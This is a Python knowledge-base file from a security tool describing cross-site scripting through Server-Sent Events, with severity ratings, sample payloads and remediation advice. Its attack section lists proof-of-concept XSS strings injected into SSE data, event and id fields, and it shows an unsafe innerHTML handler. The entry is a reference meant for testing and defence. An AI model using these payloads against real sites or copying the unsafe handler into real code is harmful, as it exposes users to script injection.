#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: Server-Sent Events (SSE) XSS Context
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via Server-Sent Events",
    "severity": "high",
    "cvss_score": 7.2,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "sse", "eventsource", "streaming", "realtime", "push"],
    "description": """
Server-Sent Events (SSE) XSS occurs when data pushed via EventSource is rendered in the DOM
without sanitization. SSE is used for real-time updates in dashboards, notifications, and feeds.

SEVERITY: HIGH
SSE data is often trusted as it comes from the server. Developers may not sanitize SSE payloads.
Can be exploited if attacker can inject into SSE stream or influence SSE data sources.
""",
    "attack_vector": """
SSE DATA INJECTION:
data: <script>alert(1)</script>

SSE EVENT TYPE XSS:
event: <img src=x onerror=alert(1)>
data: test

SSE ID INJECTION:
id: <script>alert(1)</script>
data: test

MULTILINE DATA:
data: {"html": "<img src=x onerror=alert(1)>"}
data: continued

SSE RETRY INJECTION:
retry: 1000
data: <script>alert(1)</script>

UNSAFE HANDLER:
source.onmessage = e => div.innerHTML = e.data;

JSON IN SSE:
data: {"notification": "<b onclick=alert(1)>Click</b>"}

SSE COMMENT BYPASS:
: comment
data: <script>alert(1)</script>
""",
    "remediation": """
DEFENSE:

1. SANITIZE all SSE data before DOM insertion
2. Use textContent, not innerHTML
3. Parse JSON and validate schema
4. Encode HTML entities server-side
5. Implement CSP
6. Validate event types
7. Use typed message handlers

SAFE SSE HANDLING:
source.onmessage = (event) => {
  const data = JSON.parse(event.data);
  element.textContent = data.message;  // Safe
};

UNSAFE:
source.onmessage = (event) => {
  element.innerHTML = event.data;  // DANGEROUS
};

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- Real-time Security Best Practices
""",
}
